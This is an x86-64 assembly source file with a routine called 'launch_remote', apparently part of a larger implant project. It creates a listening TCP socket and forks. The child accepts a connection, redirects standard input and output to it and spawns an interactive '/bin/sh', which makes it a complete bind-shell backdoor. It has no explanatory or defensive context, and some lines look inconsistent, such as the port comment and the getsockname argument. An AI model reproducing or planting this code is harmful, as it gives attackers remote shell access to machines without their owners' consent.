section .data
    extern  shell_port
    client_fd   dd 0
    sock_fd     dd 0
    serv:
        family      dw 0
        port        dw 0
        addr        dd 0
        zero        dq 0
        servlen     equ $ - serv
    client:
        cfamily      dw 0
        cport        dw 0
        caddr        dd 0
        czero        dq 0
        clen         dd 0 

section .rodata
    sh: db "/bin/sh", 0
    i: db "-i", 0
    args: dq sh, i, 0

section .text
    global launch_remote

launch_remote:
    push    rbp
    mov     rbp, rsp
    mov     rdi, 2 ; AF_INET
    mov     rsi, 1 ; SOCK_STREAM
    mov     rdx, 0 ; IP
    mov     rax, 0x29 ; socket
    syscall
    mov     [sock_fd], eax
    mov     edi, [sock_fd]
    mov     rsi, 1
    mov     rdx, 2 ; SO_REUSEADDRESS
    push    1
    lea     r10, [rsp]
    mov     r8, 4
    mov     rax, 0x36 ; setsockopt
    syscall
    mov     [family], WORD 2 ; AF_INET
    mov     [port], DWORD 0 ; htons(4343)
    mov     DWORD [addr], 0 ; htonl(INADDR_ANY)
    mov     edi, [sock_fd]
    lea     rsi, [rel serv]
    mov     rdx, servlen
    mov     rax, 0x31 ; bind
    syscall
    mov     edi, DWORD [sock_fd]
    mov     rsi, 1
    mov     rax, 0x32 ; listen
    syscall
    mov     edi, DWORD [sock_fd]
    mov     rsi, [shell_port]
    mov     DWORD [rsp], 0x10 ; sizeof(sockaddr_in)
    lea     rdx, [rsp]
    mov     rax, 0x33 ; getsockname
    syscall
    ; ecrire le port dans la globale
    mov     rax, 0x39 ; fork
    syscall
    cmp     rax, 0
    je      child
    mov     rdi, 0
    mov     rax, 0x3c
    syscall
child:
    mov     edi, DWORD [sock_fd]
    lea     rsi, [rel client]
    lea     rdx, [rel clen]
    mov     rax, 0x2b ; accept
    syscall
    mov     [client_fd], DWORD eax
    mov     edi, DWORD [client_fd]
    mov     rsi, 0
    mov     rax, 0x21 ; dup2
    syscall
    mov     edi, DWORD [client_fd]
    mov     rsi, 1
    mov     rax, 0x21 ; dup2
    syscall
    mov     edi, DWORD [client_fd]
    mov     rsi, 2
    mov     rax, 0x21 ; dup2
    syscall
    lea     rdi, [rel sh]
    lea     rsi, [rel args]
    mov     rdx, 0
    mov     rax, 0x3b ; execve
    syscall
exit:
    mov     rdi, 0
    mov     rax, 0x3c ; exit
    syscall
    leave
    ret
